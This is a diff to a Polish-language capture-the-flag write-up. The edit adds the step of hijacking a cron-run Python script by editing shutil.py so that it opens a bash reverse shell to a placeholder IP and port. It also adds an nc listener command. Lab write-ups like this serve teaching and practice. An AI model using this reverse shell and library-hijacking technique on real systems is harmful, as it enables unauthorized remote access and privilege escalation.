@@ -296,14 +296,15 @@ Widzimy, że co minutę jest wykonywany plik restore.py przez program cron.
 
 ![Cron2](img/Cron2.JPG)
 
-Wykorzystajmy to i zróbmy reverse shella:
-
-![Morpheus_RevShell](img/Morpheus_RevShell.JPG)
+Wykorzystajmy to i zróbmy reverse shella edytując plik /usr/lib/python3.8/shutil.py:
 
 ```
 import os
 os.system('bash -c "bash -i >& /dev/tcp/[IP]/[PORT] 0>&1"')
 ```
+
+Ustawmy nasłuchiwanie:
+
 ```
 nc -lvnp [PORT]
 ```
